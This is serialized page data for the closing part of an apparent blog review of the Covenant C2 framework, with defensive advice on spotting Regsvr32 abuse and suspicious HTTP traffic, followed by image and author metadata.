\"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1740px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"59.25287356321839%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABJ0AAASdAHeZh94AAABv0lEQVQoz3WSSW/CQAyFQwh7SCY7YRUIISQO/BkEHNoDQikg/v/51c9l1CLoYTSO4/n8vDj7/R4fnx/Y7Xa43W6oqgqn0wnn8xmXywX3+x2X6xVXOVX1pTfj6Kd9PB5xOBz05nEazSZarRYcx0FeFOj1eqjVXLiuq35jDHzfR7vd1hj+7/f7CMMQ3W5XfU8nSVJkaYqmgKezGVKxoyhSUJZlGI1GGAwGahNaSFL6ptMphsMhPM/T5PV6XY/Dx0mS6A8G0jbi8/2+gvM81yShCVETBXEcoyxLTCYTuQdSTe1ZIQOYncDlcqkKAiknFIVFkasSJiKYLShFFb//BVIRSyZwsVjow/ABZCI+ZGm0G42GqvsFlq/AvyUTmGYpgiBQKEsdj8faQybiEGgTRD+reQEa8wN0paG2h4T1ZLIcjB2IiYw+ZhL6GPsWaBVyQgzmikTS146o8R9QJvBlVTyvLisTqMKZbARb8ToUgdmGr1Yrzao9DI367XpQJVeL6vhN/9seWgX8mM/nCuTi8sRJrErYL8Kdx9oQyqHwfllsBq7Xa12H7XaLzWajkE6no8Oxe8jEXGzatmT2kao5fXu+ASpTLf30lvMCAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e2512df591851a8bba7030894355e6a4/68a58/call_backs.webp 1740w\"],\n    \"sizes\": \"(max-width: 1740px) 100vw, 1740px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png 1740w\"],\n    \"sizes\": \"(max-width: 1740px) 100vw, 1740px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png\",\n    \"alt\": \"call_backs\",\n    \"title\": \"call_backs\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"p\", null, \"Monitoring processes and network traffic on your system is\\ncrucial as it will be much easier to spot when something\\nis out of the ordinary. For example if you\\u2019ve never seen\\nRegsvr32 running on your system before it might be worthwhile\\nto investigate and you would be shocked at what you find.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1235px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"43.64372469635628%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAAA40lEQVQoz5VSAY6DIBDk/z806aXt5WhR0KIWFRXndmlo2sR65yYTYFlgdgYhpYRSOeq6hrU2jq+43WzMM5xzGIZhFV3XoWkaiIoO8KRt7xjHcRPzPCOE8BwTeL0sCyFAaG2gC02vd0jx2NwHfnCaJojT8YQiL1CaMjLltrz3H1tbA9ezPDwXh8PX8yJObum0hb7vI0uRkyGlMfCUDKTF9IeOa+BWlVKRjDCVhVQauiJHGxf1+G+kWjYmy7KHyz/yAk36FbrE8fxN9P0uY1It68huC3VV6OkPubujr9O+XbaHZYpfFSy+awtw2GkAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/72670/procexp_regsvr.webp 1235w\"],\n    \"sizes\": \"(max-width: 1235px) 100vw, 1235px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png 1235w\"],\n    \"sizes\": \"(max-width: 1235px) 100vw, 1235px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png\",\n    \"alt\": \"RegsvrImage\",\n    \"title\": \"RegsvrImage\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"However, knowing what\\u2019s going in and out of your network is just as\\nimportant if you opened wireshark and noticed a lot of http\\ntraffic that would be highly suspicious.\\nFor example, if you noticed this http traffic.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1896px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"37.13080168776371%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABJ0AAASdAHeZh94AAABdUlEQVQoz12Pa1OCQBSG+f9/pvKaWtmoKeAooIKIoHIVBNQcpyS1t8Pqpz48c97dc84zu5yZmpiGU+iRDiOeQVtrsLYWYbKsBhrrzRMDZjqH9+VinflYn/6RBfCONriBs0Nb99E1Q/TMCLy1geQdIPkHCIsYzYmNd9VBxwioF0FLMsz3Vxi7Cwyqs+2ZoRNGfAYn+SZ6lgpxpYNfahBtHeNoRSwhLKdo6TLaMwV9e4aBa0IOVlBjl/oOY3HcMKxjhMVnCk7d1zAMi1CSCia7Z4zSKuS4jEXWhBSVIHiP6AcF9P0n8M4DOw/Wt3OefXTgMVpwMxmctn+DtMlFdUy2LxinDcoNWKcWiWu0WCZBBYOwyvKQqrypQYnrdF+FffkgGU90Yf+McuErDVdo+SZVkhrLuXAYVSG4RYheiWQl9JwCCStsJp/N5Tdhjwmdi3gX0gsUes0oqbOaY3232ILgkNAtkbRMXy6yOzaT3IXnm9D9Ja48/gBBhu/E9xgU6QAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5220c523646208697ab06ddf88fd8e9b/fe160/http_traffic.webp 1896w\"],\n    \"sizes\": \"(max-width: 1896px) 100vw, 1896px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png 1896w\"],\n    \"sizes\": \"(max-width: 1896px) 100vw, 1896px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png\",\n    \"alt\": \"http-traffic\",\n    \"title\": \"http-traffic\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Upon noticing this you followed the http stream you would notice this.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1239px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"69.65294592413237%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAABtElEQVQ4y6VTa0/DMAzs//9T09Y0TQds05BA60BIsHUPoAWExniMw5fEK9s3RKVTEjs+n+00mVy/YFa9onl+R/20xUP9hs32Cx9fO7x//h1JtdxiWjZYrzdomi12u2/850vOL2qcna1QFEuMx/eYThtMrxqUZVj9OaIsa0wmNS4vH/2etivelZX2m5tnJLZYIMvmyPMKvd4dut2AXm8GI3ZCbWk6O9gTxszjfo7+yRKJ6y/hhIyEdOaugrVzn0QT6Zl+tRF6x7kFrKyDwQpJLgp9gMDaSkpvFWdCQNU806ckxgT1JKI6+mhn6zwhL7BElhIyxsCoigmVjCtJvLooQpUPR+tQ8nEpNgbvAyOonopTSU51FEJCotO5xXAohFkkOQ4OPQ2Np3r1M7nvdYwhmZNEPO8JWZJeCkNo+2VjAj91E8p0LtyhSh0m7Z7Q9zANTVZ15vcQbBjCIXH7XEwcUldaMRiugkJtfDu1QJiadoJaoqrRvivoOz2Vd5jFpjKzPpV9oAnZ9dkolGBvi6T+2dhCDrkoKKoAJ8Eu2mR1/Ur+gIX30e6KyoPnzM78nne5jsZr/ADtr9kuj/+ORQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a969e078f7a9d5d4959286f79ca13bda/c34b5/long-command.webp 1239w\"],\n    \"sizes\": \"(max-width: 1239px) 100vw, 1239px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png 1239w\"],\n    \"sizes\": \"(max-width: 1239px) 100vw, 1239px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png\",\n    \"alt\": \"encoded-command\",\n    \"title\": \"encoded-command\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"take-aways\"\n  }, \"Take Aways\"), mdx(\"p\", null, \"Although Covenant may seem somewhat limited in what it can\\ndo compared to other C2\\u2019s such as Powershell Empire\\nor Pupy. You have to keep in mind this came out about in February,\\nregardless Covenant can already do a lot and comes with a vast amount\\nof rich features that are hard to ignore.\\nOverall Covenant is a solid choice for a C2 framework.\"), mdx(\"p\", null, \"References:\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Regsvr32 Info\")));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABV0lEQVQoz1WRW07CYBSEux0DkghGxUukF6jQFuSur0ZwL4oJ6JrADUChkEATwG2Mc/qXBh9O5jszc/rQX0udZGCkszBSZ5GaMR9r9fIO3sVtsifZKTX939NqLM7tNhbFJhalFoKHDubkQLyS+C3uHKsZcUAv6VAX7Ek3KHfZaUBzslcIWFyaDSypKzkgR8qPLDnCK+lYraOO8mWPPLtDrw6tlb/H2qpho3vYGFWEMYdmLdoPHApLftwRjbOw+Ih1wYVm524w9vqYOD1MKq+YeG8YU3/cHsZu7LkqH0tHhrvq9FUmXOVd+QWafm1j2P3AqMPpDtSQv2I9eLIPxX8aRDPizffzp8rEIw/b79AqmXNsLQ973cHOcLE3PezIeyvWyHMj3RmOYo5kv1Y19nhP3hbKfJRcHlP+bN9oYMYH8MkzPopS7qbyfGazhFU2L7aTG58PNNXr+AO6c3F3D8V/GAAAAABJRU5ErkJggg==","aspectRatio":2.36,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/a1946/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/5b37e/pwnboard_image.png 236w,\n/static/0e4b959883f1cb5739fc23f5eb277816/49058/pwnboard_image.png 472w,\n/static/0e4b959883f1cb5739fc23f5eb277816/a1946/pwnboard_image.png 944w,\n/static/0e4b959883f1cb5739fc23f5eb277816/030f1/pwnboard_image.png 1416w,\n/static/0e4b959883f1cb5739fc23f5eb277816/75927/pwnboard_image.png 1888w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/99fbb/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/77392/pwnboard_image.webp 236w,\n/static/0e4b959883f1cb5739fc23f5eb277816/1f177/pwnboard_image.webp 472w,\n/static/0e4b959883f1cb5739fc23f5eb277816/99fbb/pwnboard_image.webp 944w,\n/static/0e4b959883f1cb5739fc23f5eb277816/4a492/pwnboard_image.webp 1416w,\n/static/0e4b959883f1cb5739fc23f5eb277816/b0b8f/pwnboard_image.webp 1888w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABV0lEQVQoz1WRW07CYBSEux0DkghGxUukF6jQFuSur0ZwL4oJ6JrADUChkEATwG2Mc/qXBh9O5jszc/rQX0udZGCkszBSZ5GaMR9r9fIO3sVtsifZKTX939NqLM7tNhbFJhalFoKHDubkQLyS+C3uHKsZcUAv6VAX7Ek3KHfZaUBzslcIWFyaDSypKzkgR8qPLDnCK+lYraOO8mWPPLtDrw6tlb/H2qpho3vYGFWEMYdmLdoPHApLftwRjbOw+Ih1wYVm524w9vqYOD1MKq+YeG8YU3/cHsZu7LkqH0tHhrvq9FUmXOVd+QWafm1j2P3AqMPpDtSQv2I9eLIPxX8aRDPizffzp8rEIw/b79AqmXNsLQ973cHOcLE3PezIeyvWyHMj3RmOYo5kv1Y19nhP3hbKfJRcHlP+bN9oYMYH8MkzPopS7qbyfGazhFU2L7aTG58PNNXr+AO6c3F3D8V/GAAAAABJRU5ErkJggg==","aspectRatio":2.36231884057971,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/3ddd4/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/078a8/pwnboard_image.png 163w,\n/static/0e4b959883f1cb5739fc23f5eb277816/e56da/pwnboard_image.png 327w,\n/static/0e4b959883f1cb5739fc23f5eb277816/3ddd4/pwnboard_image.png 653w,\n/static/0e4b959883f1cb5739fc23f5eb277816/c5cc7/pwnboard_image.png 980w,\n/static/0e4b959883f1cb5739fc23f5eb277816/eebd2/pwnboard_image.png 1306w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/0acdf/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/ac59e/pwnboard_image.webp 163w,\n/static/0e4b959883f1cb5739fc23f5eb277816/7660b/pwnboard_image.webp 327w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0acdf/pwnboard_image.webp 653w,\n/static/0e4b959883f1cb5739fc23f5eb277816/75470/pwnboard_image.webp 980w,\n/static/0e4b959883f1cb5739fc23f5eb277816/68d47/pwnboard_image.webp 1306w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABV0lEQVQoz1WRW07CYBSEux0DkghGxUukF6jQFuSur0ZwL4oJ6JrADUChkEATwG2Mc/qXBh9O5jszc/rQX0udZGCkszBSZ5GaMR9r9fIO3sVtsifZKTX939NqLM7tNhbFJhalFoKHDubkQLyS+C3uHKsZcUAv6VAX7Ek3KHfZaUBzslcIWFyaDSypKzkgR8qPLDnCK+lYraOO8mWPPLtDrw6tlb/H2qpho3vYGFWEMYdmLdoPHApLftwRjbOw+Ih1wYVm524w9vqYOD1MKq+YeG8YU3/cHsZu7LkqH0tHhrvq9FUmXOVd+QWafm1j2P3AqMPpDtSQv2I9eLIPxX8aRDPizffzp8rEIw/b79AqmXNsLQ973cHOcLE3PezIeyvWyHMj3RmOYo5kv1Y19nhP3hbKfJRcHlP+bN9oYMYH8MkzPopS7qbyfGazhFU2L7aTG58PNNXr+AO6c3F3D8V/GAAAAABJRU5ErkJggg==","aspectRatio":2.375,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/502b1/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/f2e6d/pwnboard_image.png 114w,\n/static/0e4b959883f1cb5739fc23f5eb277816/4ddba/pwnboard_image.png 229w,\n/static/0e4b959883f1cb5739fc23f5eb277816/502b1/pwnboard_image.png 457w,\n/static/0e4b959883f1cb5739fc23f5eb277816/7ddc2/pwnboard_image.png 686w,\n/static/0e4b959883f1cb5739fc23f5eb277816/435bf/pwnboard_image.png 914w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/15384/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/31fce/pwnboard_image.webp 114w,\n/static/0e4b959883f1cb5739fc23f5eb277816/e3e25/pwnboard_image.webp 229w,\n/static/0e4b959883f1cb5739fc23f5eb277816/15384/pwnboard_image.webp 457w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0258d/pwnboard_image.webp 686w,\n/static/0e4b959883f1cb5739fc23f5eb277816/64ea2/pwnboard_image.webp 914w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/0e4b959883f1cb5739fc23f5eb277816/6050d/pwnboard_image.png"}}}],"pathPrefix":"/authors/NotoriousRebel","first":true,"last":true,"index":1,"pageCount":1,"additionalContext":{"author":{"authorsPage":true,"bio":"Core developer for theHarvester \nand enjoys red teaming Windows.\n","id":"7971a4b2-8c15-5c5b-86fd-173de5dac0d9","name":"NotoriousRebel","featured":false,"social":[{"url":"https://github.com/NotoriousRebel"},{"url":"https://twitter.com/NotoriousRebel1"}],"slug":"/authors/NotoriousRebel","avatar":{"small":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/afb2b/rebel_avatar.jpg 13w,\n/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/03612/rebel_avatar.jpg 75w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/58718/rebel_avatar.webp 13w,\n/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/ed320/rebel_avatar.webp 75w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 50px) 100vw, 50px"},"medium":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/7c20e/rebel_avatar.jpg 25w,\n/static/c908e3ef9d0ce562bad340430706f232/fa1ea/rebel_avatar.jpg 50w,\n/static/c908e3ef9d0ce562bad340430706f232/61cdf/rebel_avatar.jpg 100w,\n/static/c908e3ef9d0ce562bad340430706f232/59538/rebel_avatar.jpg 150w,\n/static/c908e3ef9d0ce562bad340430706f232/fd013/rebel_avatar.jpg 200w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 480w","srcWebp":"/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp","srcSetWebp":"/static/c908e3ef9d0ce562bad340430706f232/74aad/rebel_avatar.webp 25w,\n/static/c908e3ef9d0ce562bad340430706f232/e7b2c/rebel_avatar.webp 50w,\n/static/c908e3ef9d0ce562bad340430706f232/66016/rebel_avatar.webp 100w,\n/static/c908e3ef9d0ce562bad340430706f232/d9b14/rebel_avatar.webp 150w,\n/static/c908e3ef9d0ce562bad340430706f232/6b183/rebel_avatar.webp 200w,\n/static/c908e3ef9d0ce562bad340430706f232/35871/rebel_avatar.webp 480w","sizes":"(max-width: 100px) 100vw, 100px"},"large":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAQDAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAABrjkos4bjyQbg/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEEP/aAAgBAQABBQIPpKdiMjE1tF6Bo9S+sgB//8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAHRAAAQIHAAAAAAAAAAAAAAAAIQABAhAREiAykf/aAAgBAQAGPwJyVFdXsyy1w//EABwQAQADAAIDAAAAAAAAAAAAAAEAESExQVFhgf/aAAgBAQABPyGgGxzD8Vto5aineSuMvMtY09sFBhzKSLP/2gAMAwEAAgADAAAAENsoff/EABcRAQADAAAAAAAAAAAAAAAAAAEAEBH/2gAIAQMBAT8QJhf/xAAWEQADAAAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8QK//EAB0QAQACAgIDAAAAAAAAAAAAAAEAESExQVFxgfD/2gAIAQEAAT8Qx7JC2msS6kiAGs9l/ZgldMv9QZliIREN+PUDUxyJBIasmo7xG1SdpP/Z","aspectRatio":1,"src":"/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg","srcSet":"/static/c908e3ef9d0ce562bad340430706f232/a2637/rebel_avatar.jpg 82w,\n/static/c908e3ef9d0ce562bad340430706f232/15203/rebel_avatar.jpg 164w,\n/static/c908e3ef9d0ce562bad340430706f232/ec46e/rebel_avatar.jpg 328w,\n/static/c908e3ef9d0ce562bad340430706f232/836e2/rebel_avatar.jpg 